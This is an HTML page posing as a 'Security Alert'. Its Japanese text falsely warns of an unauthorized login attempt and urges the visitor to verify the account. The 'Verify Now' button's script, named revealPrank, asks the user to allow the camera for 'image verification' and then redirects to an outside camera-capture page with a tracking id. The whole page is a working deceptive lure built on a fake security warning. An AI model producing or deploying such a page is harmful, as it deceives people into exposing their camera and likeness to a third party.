<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #ff7e5f, #feb47b);
            font-family: Arial, sans-serif;
            color: white;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.6);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        p {
            font-size: 1.2rem;
            margin-bottom: 20px;
        }

        button {
            background-color: #ff7e5f;
            border: none;
            padding: 10px 20px;
            font-size: 1rem;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }

        button:hover {
            background-color: #feb47b;
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Alert</h1>
        <p>お使いのデバイスで不正なログイン試行が検出されました。すぐにボタンを押してアカウントを認証してください。</p>
        <button onclick="revealPrank()">Verify Now</button>
    </div>

    <script>
        function revealPrank() {
            alert('カメラを許可して、画像認証をしてください。');
            window.location.href = 'https://psannetwork.net/camera/index.php?id=Knbl4J91btTh9fwCTedQi29fz5wpBT&url=https://google.com';
        }
    </script>
</body>
</html>
